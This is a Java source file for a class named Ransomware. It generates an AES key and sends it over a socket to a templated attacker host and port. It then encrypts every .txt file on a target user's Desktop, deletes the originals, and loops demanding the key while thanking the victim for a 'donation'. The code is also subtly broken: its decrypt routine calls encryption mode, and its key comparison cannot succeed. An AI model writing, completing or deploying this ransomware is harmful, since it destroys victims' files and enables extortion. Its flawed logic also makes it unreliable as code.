import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.FilenameFilter;
import java.io.OutputStream;
import java.net.Socket;
import java.security.Key;
import java.util.Base64;
import java.util.Scanner;

import javax.crypto.Cipher;
import javax.crypto.KeyGenerator;
import javax.crypto.SecretKey;
import javax.crypto.spec.SecretKeySpec;

public class Ransomware {
    private final static String ALGORITHM = "AES";
    private final static String TRANSFORMATION = "AES";
    private final static String baseDir = "/home/target/Desktop/";
    private final static SecretKey key = Ransomware.generateKey();
    private final static String host = "__ip__";
    private final static int port = Integer.parseInt("__port__");

    public Ransomware() throws Exception {
        Ransomware.sendKey();
        Ransomware.fireUp();
        while (true) {
            Ransomware.recover();
        }
    }

    private static void fireUp() {
        File file = new File(baseDir);
        File[] files = file.listFiles(new FilenameFilter() {
            @Override
            public boolean accept(File dir, String name) {
                return name.toLowerCase().endsWith(".txt");
            }
        });

        for (File f : files) {
            Ransomware.encryptRoutine(baseDir + f.getName());
        }
    }

    private static void encryptRoutine(String fileName) {
        File inputFile = new File(fileName);
        File encryptedFile = new File(fileName + ".encrypted");

        try {
            Ransomware.encrypt(inputFile, encryptedFile);
            System.out.println(inputFile + "is encrypted now");
            inputFile.delete();
        } catch (Exception e) {
            System.out.println(e.getMessage());
            e.printStackTrace();
        }
    }

    private static void decryptRoutine(String fileName) {
        File inputFile = new File(fileName);
        File decryptedFile = new File(fileName + ".decrypted");

        try {
            Ransomware.decrypt(inputFile, decryptedFile);
            System.out.println(inputFile + "is decrypted now");
            inputFile.delete();
        } catch (Exception e) {
            System.out.println(e.getMessage());
            e.printStackTrace();
        }
    }

    private static SecretKey generateKey() {
        try {
            KeyGenerator keyGen = KeyGenerator.getInstance(ALGORITHM);
            keyGen.init(256);
            SecretKey secretKey = keyGen.generateKey();
            return secretKey;
        } catch (Exception e) {
            System.out.println(e.getMessage());
        }
        return null;
    }

    private static void sendKey() throws Exception {
        Socket socket = new Socket(host, port);
        OutputStream socketOutputStream = socket.getOutputStream();

        String encodedKey = Base64.getEncoder().encodeToString(key.getEncoded());
        socketOutputStream.write(encodedKey);
        socketOutputStream.flush();

        socket.close();
    }

    private static void encrypt(File inputFile, File outputFile) throws Exception {
        doCrypto(Cipher.ENCRYPT_MODE, inputFile, outputFile);
    }

    private static void decrypt(File inputFile, File outputFile) throws Exception {
        doCrypto(Cipher.ENCRYPT_MODE, inputFile, outputFile);
    }

    private static void doCrypto(int mode, File inputFile, File outputFile) throws Exception {
        Cipher cipher = Cipher.getInstance(TRANSFORMATION);
        cipher.init(mode, key);

        FileInputStream inputStream = new FileInputStream(inputFile);
        byte[] inputBytes = new byte[(int) inputFile.length()];
        inputStream.read(inputBytes);

        byte[] outputBytes = cipher.doFinal(inputBytes);
        FileOutputStream outputStream = new FileOutputStream(outputFile);
        outputStream.write(outputBytes);

        inputStream.close();
        outputStream.close();
    }

    private static void recover() {
        Scanner scanner = new Scanner(System.in);
        System.out.println("Enter the key to recover your files:");

        String code = scanner.nextLine();
        System.out.println("Entered key is: " + code);
        byte[] decodedInput = Base64.getDecoder().decode(code);

        if (decodedInput.equals(key.getEncoded())) {
            System.out.println("Thanks for your donation :)");
            File file = new File(baseDir);
            File[] files = file.listFiles(new FilenameFilter() {
                @Override
                public boolean accept(File dir, String name) {
                    return name.toLowerCase().endsWith("encrypted");
                }
            });

            for (File f : files) {
                System.out.println(f.getName());
                Ransomware.decryptRoutine(baseDir + f.getName());
            }
        } else {
            System.out.println("Nice try! Keep going... :P");
        }

        scanner.close();
    }
}